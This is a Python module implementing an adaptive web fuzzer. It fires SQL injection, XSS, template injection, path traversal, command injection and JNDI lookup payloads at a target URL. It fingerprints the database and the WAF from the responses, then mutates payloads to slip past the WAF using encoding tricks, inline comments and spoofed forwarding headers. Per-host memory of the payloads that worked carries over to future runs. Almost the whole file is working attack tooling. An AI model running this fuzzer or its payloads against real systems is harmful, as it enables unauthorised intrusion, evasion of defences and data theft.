"""Adaptive Feedback-Loop Fuzzing Logic.

adaptive_fuzz(target_url, initial_payload_set)

Closed-loop fuzzer: sends the payload set at a target URL, then parses every
HTTP response - status code, response time, headers (Server, X-Powered-By,
WAF fingerprint headers, Set-Cookie shape, Content-Type) and the body
(error stack traces, DB error signatures, WAF block pages) - and MUTATES the
working payload list based on what came back:

* SQL syntax error detected  -> switch to payloads tuned to the identified
  database engine (MySQL / PostgreSQL / MSSQL / SQLite / Oracle) including
  DB-specific comment styles, stacked queries and evasion variants.
* WAF / rate-limit block (403 / 406 / 429, WAF headers or block-page text)
  -> apply bypass mutations: case randomization, inline comment insertion,
  URL / double-URL encoding, unicode overlong, HPP, header-level tricks
  (X-Forwarded-For spoof, X-Original-URL), and a marked cooldown/rotation.
* Stack trace / verbose error -> widen the fuzz with delimiter, format-string
  and type-confusion payloads aimed at the leaked framework/language.
* Reflected input echo       -> add closing-tag / event-handler / context
  breaking mutations (XSS probe ladder).
* Connection / 5xx anomaly   -> flag target instability, back off.

granular=True switches the adaptation from round-wide (one mutation family
per round) to PER-PAYLOAD: every response mutates only the payload that
produced it (sql_error payload -> its DB-tuned siblings; blocked payload ->
bypass mutations of itself; reflected payload -> XSS ladder), while
unsignalled payloads are retried with a different mutator. Round-wide mode
stays available as granular=False.

Each round keeps signals of what worked (anomaly delta vs baseline), narrows
towards the highest-signal payload family and reports a full round-by-round
log with the final adapted payload set, so the operator sees exactly why the
fuzzer converged on the payloads it kept.

Everything runs inside the tool-call timeout budget: total duration is
capped, requests are sequential and failures are tolerated.
"""

import base64
import json
import random
import re
import time
import urllib.parse

import requests

from .payload_memory import PAYLOAD_MEMORY

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")

MAX_ROUNDS = 6
REQUEST_TIMEOUT = 8
ROUND_BUDGET = 15.0        # seconds per round
TOTAL_BUDGET = 90.0        # seconds whole run
MAX_PAYLOADS_PER_ROUND = 12

# ---------------------------------------------------------------- signals ---

SQL_ERRORS = [
    (r"you have an error in your sql syntax.*?mysql|mysql_fetch|mysqli?_?",
     "mysql"),
    (r"pg_query|postgresql|psycopg|unterminated (?:quoted )?string|"
     r"ERROR:\s+syntax error at or near", "postgresql"),
    (r"microsoft sql server|mssql|odbc.*driver.*sql|unclosed quotation mark",
     "mssql"),
    (r"sqlite(?:3)?(?:_query| JDBCDriver|OpenHelper|\.\w+db)|"
     r"unrecognized token", "sqlite"),
    (r"ora-\d{5}|oracle.*jdbc", "oracle"),
    (r"warning.*mysql|unclosed quotation|quoted string not properly "
     r"terminated", "generic-sql"),
]

DB_SIGNATURE_HEADERS = [
    (r"x-powered-by.*asp\.net", "mssql"),
    (r"server.*microsoft-iis", "mssql"),
    (r"x-powered-by.*php|server.*apache", "mysql"),
]

WAF_BLOCK_MARKERS = [
    ("cloudflare", r"cloudflare|attention required|cf-ray"),
    ("aws-waf", r"aws waf|request blocked.*aws"),
    ("akamai", r"akamai|reference #\d+\.\w+"),
    ("imperva/securestack", r"imperva|incapsula|securestack"),
    ("f5-bigip", r"the requested url was rejected|bigip|f5"),
    ("sucuri", r"sucuri|cloudproxy"),
    ("modsecurity", r"mod_security|modsecurity"),
    ("wordfence", r"wordfence"),
    ("generic", r"blocked|forbidden|waf|firewall|malicious"),
]

STACK_TRACE_MARKERS = [
    r"traceback \(most recent call last\)",
    r"at [\w$.]+\([\w.]+\.java:\d+\)",
    r"fatal error|uncaught exception|exception in thread",
    r"warning|notice|deprecated.*\.php on line \d+",
    r"system\.exception|stack trace:",
    r"segfault|panic:|goroutine \d+",
]

REFLECTION_HINTS = re.compile(
    r"<script[^>]*>|onerror\s*=|onload\s*=|javascript:", re.I)

framework_from_trace = [
    (r"django|/django/", "django"),
    (r"flask|werkzeug|jinja2", "flask"),
    (r"laravel|illuminate", "laravel"),
    (r"spring|tomcat|struts", "java"),
    (r"asp\.net|__viewstate", "aspnet"),
    (r"rails|actioncontroller", "rails"),
    (r"node_modules|express", "node"),
]


# ------------------------------------------------------------- payload db ---

SQLI_BY_DB = {
    "mysql": [
        "' OR '1'='1' -- -", "' AND SLEEP(4)-- -", "' UNION SELECT "
        "NULL,version()-- -", "' /*!50000UNION*/ /*!50000SELECT*/ "
        "NULL,NULL-- -", "' oRDer by 1-- -", "admin'-- -",
        "' AND (SELECT 1 FROM (SELECT(SLEEP(4)))abc)-- -",
        "%27%20or%201%3D1--%20-",
    ],
    "postgresql": [
        "' OR '1'='1'::text-- -", "'; SELECT pg_sleep(4)-- -",
        "' UNION SELECT NULL,version()-- -", "'||'a'||'b",
        "admin'-- -", "' AND 1=CAST((SELECT version()) AS INT)-- -",
    ],
    "mssql": [
        "' OR '1'='1'-- -", "'; WAITFOR DELAY '0:0:4'-- -",
        "' UNION SELECT NULL,@@version-- -", "admin'--",
        "' AND 1=CONVERT(INT,(SELECT @@version))-- -",
    ],
    "sqlite": [
        "' OR '1'='1'-- -", "' UNION SELECT NULL,sqlite_version()-- -",
        "'||sqlite_version()||'", "admin'-- -",
    ],
    "oracle": [
        "' OR '1'='1'-- -", "' UNION SELECT NULL,banner FROM v$version-- -",
        "'||DBMS_PIPE.RECEIVE_MESSAGE('a',4)-- -", "admin'-- -",
    ],
    "generic-sql": [
        "' OR '1'='1'-- -", "' OR '1'='1'#", "1' ORDER BY 1-- -",
        "1' UNION SELECT NULL-- -", "admin'-- -", "\" OR \"1\"=\"1",
    ],
}

WAF_BYPASS_MUTATORS = [
    ("case_random", lambda p: "".join(
        c.upper() if i % 2 else c.lower() for i, c in enumerate(p))),
    ("inline_comment", lambda p: re.sub(
        r"(?i)\b(UNION|SELECT|OR|AND|INSERT|UPDATE|DELETE|FROM)\b",
        lambda m: m.group(1)[0] + "/**/" + m.group(1)[1:], p)),
    ("url_encode", lambda p: urllib.parse.quote(p, safe="")),
    ("double_encode", lambda p: urllib.parse.quote(
        urllib.parse.quote(p, safe=""), safe="")),
    ("unicode_overlong", lambda p: p.replace("'", "%CA%BC").replace(
        " ", "%09")),
    ("hpp", lambda p: p.replace("=", "=*&", 1) if "=" in p else p),
]

WAF_HEADER_TRICKS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Original-URL": "/"},
    {"X-Rewrite-URL": "/"},
    {"Referer": "https://www.google.com/"},
]

XSS_REFLECTION_PAYLOADS = [
    "\"><script>alert(1)</script>",
    "'\"><img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "{{7*7}}", "${7*7}", "<%= 7*7 %>",
]

STACK_TRACE_PROBES = [
    "'", "\"", "[]", "{{7*7}}", "${7*7}", "%s%s%s%s", "%n", "..%c0%af..",
    "A" * 300, "\x00", "%00", "$(id)", "`id`", "{{constructor.constructor"
    "('return 1')()}}",
]

TYPE_CONFUSION = ["true", "false", "null", "0", "-1", "1e309", "[]", "{}",
                  "\x00", "%00"]

DEFAULT_INITIAL = [
    "' OR '1'='1'-- -", "' OR '1'='1'#", "\" OR \"1\"=\"1", "' AND '1'='1",
    "1 UNION SELECT NULL--", "admin'-- -", "<script>alert(1)</script>",
    "../../etc/passwd", "{{7*7}}", "${jndi:ldap://x}", ";id", "| id",
]


# ------------------------------------------------------------ mutations ----

def _mutate_waf(payload):
    mutator_name, fn = random.choice(WAF_BYPASS_MUTATORS)
    try:
        return fn(payload), mutator_name
    except Exception:
        return payload, "noop"


def _randomize_case(payload):
    return "".join(c.upper() if random.random() < 0.5 else c.lower()
                   for c in payload)


# ------------------------------------------------------- response parsing ---

def _classify_response(resp, elapsed, baseline_time, baseline_status):
    """Return dict of signals parsed from one HTTP response."""
    body = ""
    try:
        body = resp.text[:20000]
    except Exception:
        pass
    headers = {str(k).lower(): str(v) for k, v in resp.headers.items()}
    sig = {
        "status": resp.status_code,
        "elapsed": round(elapsed, 3),
        "db_engine": None,
        "waf": None,
        "stack_trace": None,
        "reflection": False,
        "anomaly": None,
    }

    # -- SQL engine fingerprint from error text or headers
    for pattern, engine in SQL_ERRORS:
        if re.search(pattern, body, re.I):
            sig["db_engine"] = engine
            sig["anomaly"] = "sql_error"
            break
    if not sig["db_engine"]:
        for hdr_pat, engine in DB_SIGNATURE_HEADERS:
            for key, val in headers.items():
                if re.search(hdr_pat, key + ": " + val, re.I):
                    sig["db_engine"] = engine
                    break

    # -- WAF detection
    for waf_name, marker in WAF_BLOCK_MARKERS:
        if re.search(marker, body, re.I):
            sig["waf"] = waf_name
            sig["anomaly"] = "waf_block"
            break
    if sig["waf"] is None:
        for key, val in headers.items():
            for waf_name, marker in WAF_BLOCK_MARKERS:
                if waf_name != "generic" and re.search(
                        marker, key + ": " + val, re.I):
                    sig["waf"] = waf_name
                    sig["anomaly"] = "waf_block"
                    break

    # -- Stack trace / verbose errors
    if sig["anomaly"] is None:
        for marker in STACK_TRACE_MARKERS:
            if re.search(marker, body, re.I):
                sig["anomaly"] = "stack_trace"
                for fw_pat, fw in framework_from_trace:
                    if re.search(fw_pat, body, re.I):
                        sig["stack_trace"] = fw
                        break
                if not sig["stack_trace"]:
                    sig["stack_trace"] = "unknown"
                break

    # -- Reflection (payload echoed back)
    if sig["anomaly"] is None:
        try:
            sig["reflection"] = bool(REFLECTION_HINTS.search(body))
            if sig["reflection"]:
                sig["anomaly"] = "reflection"
        except Exception:
            pass

    # -- Status / timing anomalies
    if sig["anomaly"] is None:
        if resp.status_code >= 500:
            sig["anomaly"] = "server_error"
        elif baseline_status and resp.status_code != baseline_status \
                and resp.status_code in (403, 406, 429):
            sig["anomaly"] = "waf_block"
            if sig["waf"] is None:
                sig["waf"] = "status-based"
        elif baseline_time and elapsed > baseline_time * 2 + 2:
            sig["anomaly"] = "time_delay"

    return sig


# ------------------------------------------------------------ main fuzzer --

def adaptive_fuzz(target_url, initial_payload_set="", max_rounds=6,
                  method="GET", param="q", request_timeout=8,
                  granular=True, use_memory=True):
    """Closed-loop adaptive fuzzer. Returns JSON string with:
    baseline info, round-by-round log (what response was parsed, which
    mutation family was applied, which payloads were kept), adapted payload
    set and final verdict per payload family."""
    try:
        max_rounds = max(1, min(int(max_rounds or MAX_ROUNDS), MAX_ROUNDS))
    except (TypeError, ValueError):
        max_rounds = MAX_ROUNDS
    try:
        request_timeout = max(1, min(float(request_timeout or
                                          REQUEST_TIMEOUT), 30))
    except (TypeError, ValueError):
        request_timeout = REQUEST_TIMEOUT
    if not (isinstance(target_url, str) and target_url.strip()):
        return json.dumps({"error": "adaptive_fuzz: target_url required"})
    target_url = target_url.strip()
    method = (method or "GET").upper()
    param = param or "q"
    start_all = time.time()

    # ---- parse initial payload set
    if isinstance(initial_payload_set, (list, tuple)):
        payloads = list(initial_payload_set)
    elif isinstance(initial_payload_set, str) and \
            initial_payload_set.strip().startswith("["):
        try:
            payloads = json.loads(initial_payload_set)
        except json.JSONDecodeError:
            payloads = None
    else:
        payloads = None
    if not isinstance(payloads, list):
        payloads = [ln.strip() for ln in
                    str(initial_payload_set or "").splitlines() if ln.strip()]
    if not payloads:
        payloads = list(DEFAULT_INITIAL)
    payloads = [str(p) for p in payloads][:50]

    # ---- cross-session payload memory: seed + record results
    host_key = urllib.parse.urlsplit(target_url).netloc or target_url
    seeded_payloads = []
    memory_recorded = 0
    if use_memory:
        remembered = PAYLOAD_MEMORY.seed(host_key, limit=8)
        have = set(payloads)
        for p in remembered:
            if p not in have:
                payloads.append(p)
                have.add(p)
                seeded_payloads.append(p)
        payloads = payloads[:50]

    session = requests.Session()
    session.headers.update({"User-Agent": UA})
    original_payloads = list(payloads)

    def _send(payload, extra_headers=None):
        """Send one fuzz request. Returns (response_or_None, elapsed)."""
        headers = dict(extra_headers or {})
        t0 = time.time()
        try:
            if method == "GET":
                resp = session.get(target_url, params={param: payload},
                                   headers=headers,
                                   timeout=request_timeout,
                                   allow_redirects=False)
            else:
                resp = session.request(
                    method, target_url, data={param: payload},
                    headers=headers, timeout=request_timeout,
                    allow_redirects=False)
            return resp, time.time() - t0
        except requests.RequestException:
            return None, time.time() - t0

    rounds = []
    baseline_status = None
    baseline_time = None
    db_engine_detected = None
    waf_detected = None
    working_payloads = []       # payloads that produced a signal
    total_requests = 0

    # ---- baseline probe
    resp, elapsed = _send("")
    total_requests += 1
    if resp is not None:
        baseline_status = resp.status_code
        baseline_time = elapsed
        base_sig = _classify_response(resp, elapsed, None, None)
        if base_sig["db_engine"]:
            db_engine_detected = base_sig["db_engine"]
        if base_sig["waf"]:
            waf_detected = base_sig["waf"]

    # ---- adaptive loop
    for round_no in range(1, max_rounds + 1):
        if time.time() - start_all > TOTAL_BUDGET:
            break
        round_start = time.time()
        round_log = {
            "round": round_no,
            "payloads_tried": [],
            "parsed_signals": [],
            "adaptation": None,
            "kept_payloads": [],
        }
        next_payloads = []
        mutation_applied = None

        for payload in payloads[:MAX_PAYLOADS_PER_ROUND]:
            if time.time() - round_start > ROUND_BUDGET or \
                    time.time() - start_all > TOTAL_BUDGET:
                break
            extra_headers = None
            if waf_detected:
                trick = random.choice(WAF_HEADER_TRICKS)
                extra_headers = dict(trick)
            resp, elapsed = _send(payload, extra_headers)
            total_requests += 1
            if resp is None:
                round_log["parsed_signals"].append({
                    "payload": payload[:80], "error": "connection_failed"})
                continue
            sig = _classify_response(resp, elapsed, baseline_time,
                                     baseline_status)
            sig["payload"] = payload[:200]
            round_log["parsed_signals"].append(sig)
            round_log["payloads_tried"].append(payload[:120])
            if use_memory:
                PAYLOAD_MEMORY.record(
                    host_key, payload, bool(sig.get("anomaly")),
                    vuln_class=sig.get("anomaly") or "",
                    db=sig.get("db_engine") or "",
                    waf=sig.get("waf") or "",
                    source="adaptive_fuzz")
                memory_recorded += 1

            if sig["db_engine"]:
                db_engine_detected = sig["db_engine"]
            if sig["waf"]:
                waf_detected = sig["waf"]

            if sig["anomaly"]:
                working_payloads.append({
                    "payload": payload,
                    "signal": sig["anomaly"],
                    "db": sig["db_engine"],
                    "waf": sig["waf"],
                    "status": sig["status"],
                    "elapsed": sig["elapsed"],
                })
                round_log["kept_payloads"].append(payload[:120])

        # ---------------- adaptation decision ----------------
        anomalies_this_round = [s.get("anomaly") for s in
                                round_log["parsed_signals"] if s.get("anomaly")]

        if granular:
            # PER-PAYLOAD adaptation: each response mutates only the
            # payload that produced it; unsignalled payloads get a
            # different mutator for the next round.
            next_payloads = []
            mut_names = set()
            for sig in round_log["parsed_signals"]:
                base = sig.get("payload") or ""
                anom = sig.get("anomaly")
                if anom == "sql_error" and db_engine_detected:
                    tuned = SQLI_BY_DB.get(db_engine_detected,
                                           SQLI_BY_DB["generic-sql"])
                    next_payloads.extend(tuned[:4])
                    mut_names.add("sqli_tuned:%s" % db_engine_detected)
                elif anom == "waf_block":
                    mp, mn = _mutate_waf(base or random.choice(payloads))
                    next_payloads.append(mp)
                    mut_names.add("waf_bypass:%s" % mn)
                elif anom == "reflection":
                    next_payloads.extend(random.sample(
                        XSS_REFLECTION_PAYLOADS, 3))
                    mut_names.add("reflection_xss_ladder")
                elif anom == "stack_trace":
                    next_payloads.extend(random.sample(
                        STACK_TRACE_PROBES, 4))
                    mut_names.add("stack_trace_probe:%s"
                                  % (sig.get("stack_trace") or "unknown"))
                elif anom == "time_delay":
                    if "'" in base:
                        next_payloads.append(base + " AND SLEEP(5)-- -")
                    mut_names.add("timing_deepen")
                elif anom == "server_error":
                    next_payloads.extend(random.sample(
                        TYPE_CONFUSION, 3))
                    mut_names.add("type_confusion")
                else:
                    # no signal on this payload: retry with a fresh mutator
                    mp, mn = _mutate_waf(base)
                    if mp != base:
                        next_payloads.append(mp)
                        mut_names.add("retry_mutated:%s" % mn)
                    else:
                        next_payloads.append(base)
            mutation_applied = "granular:" + ",".join(
                sorted(mut_names)) if mut_names else "granular:steady"
            next_payloads = next_payloads or payloads
        else:
            anomalies_this_round = [s.get("anomaly") for s in
                                    round_log["parsed_signals"]
                                    if s.get("anomaly")]

            if "sql_error" in anomalies_this_round and db_engine_detected:
                tuned = SQLI_BY_DB.get(db_engine_detected, SQLI_BY_DB[
                    "generic-sql"])
                next_payloads = tuned + [random.choice(SQLI_BY_DB["generic-sql"])
                                         for _ in range(3)]
                mutation_applied = ("sqli_tuned:%s" % db_engine_detected)

            elif "waf_block" in anomalies_this_round:
                mutated = []
                for p in payloads[:MAX_PAYLOADS_PER_ROUND]:
                    mp, mname = _mutate_waf(p)
                    mutated.append((mp, mname))
                next_payloads = [m[0] for m in mutated]
                mutation_applied = ("waf_bypass:" + ",".join(
                    sorted({m[1] for m in mutated})))

            elif "reflection" in anomalies_this_round:
                next_payloads = XSS_REFLECTION_PAYLOADS + [
                    _randomize_case(p) for p in
                    random.sample(payloads, min(3, len(payloads)))]
                mutation_applied = "reflection_xss_ladder"

            elif "stack_trace" in anomalies_this_round:
                fw = None
                for s in round_log["parsed_signals"]:
                    if s.get("stack_trace"):
                        fw = s["stack_trace"]
                        break
                next_payloads = STACK_TRACE_PROBES + TYPE_CONFUSION
                mutation_applied = ("stack_trace_probe:" + (fw or "unknown"))

            elif "time_delay" in anomalies_this_round:
                # keep timing-based payloads, deepen them
                next_payloads = [p + " AND SLEEP(5)-- -" if "'" in p
                                 else p for p in working_payloads[:4]]
                next_payloads += ["' AND (SELECT COUNT(*) FROM "
                                  "information_schema.tables)>0-- -"]
                mutation_applied = "timing_deepen"

            elif "server_error" in anomalies_this_round:
                next_payloads = ["' OR '1'='1'-- -", "{{7*7}}", "${7*7}", "[]",
                                 "%00", "A" * 100]
                mutation_applied = "type_confusion"

            else:
                # no signal: broaden with a mixed probe set
                next_payloads = (payloads[:6] +
                                 random.sample(STACK_TRACE_PROBES,
                                               min(4, len(STACK_TRACE_PROBES))))
                mutation_applied = "broaden_no_signal"

        # dedupe, cap, rotate for next round
        seen = set()
        payloads = []
        for p in next_payloads:
            if p not in seen:
                seen.add(p)
                payloads.append(p)
        payloads = payloads[:MAX_PAYLOADS_PER_ROUND]

        round_log["adaptation"] = mutation_applied
        round_log["next_payload_count"] = len(payloads)
        rounds.append(round_log)

    result = {
        "ok": True,
        "tool": "adaptive_fuzz",
        "target": target_url,
        "method": method,
        "param": param,
        "baseline": {
            "status": baseline_status,
            "response_time": round(baseline_time, 3) if baseline_time
            else None,
        },
        "fingerprints": {
            "db_engine": db_engine_detected,
            "waf": waf_detected,
        },
        "initial_payload_count": len(original_payloads),
        "total_requests": total_requests,
        "rounds": rounds,
        "signals_found": len(working_payloads),
        "memory": {
            "seeded_from_past_sessions": seeded_payloads,
            "results_recorded": memory_recorded,
            "note": ("hit/miss results for every payload were saved to "
                     "the persistent payload memory - future runs on this "
                     "host start with the historically best payloads "
                     "(payload_memory_top to inspect)."),
        },
        "working_payloads": working_payloads[:20],
        "adapted_payload_set": payloads,
        "note": ("Responses were parsed (status, timing, headers, error "
                 "signatures) and the payload set was adapted per round. "
                 "Signals like sql_error or waf_block indicate where to "
                 "focus manual exploitation; every hit is UNTESTED until "
                 "validated by the operator."),
    }
    return json.dumps(result, indent=2, ensure_ascii=False)
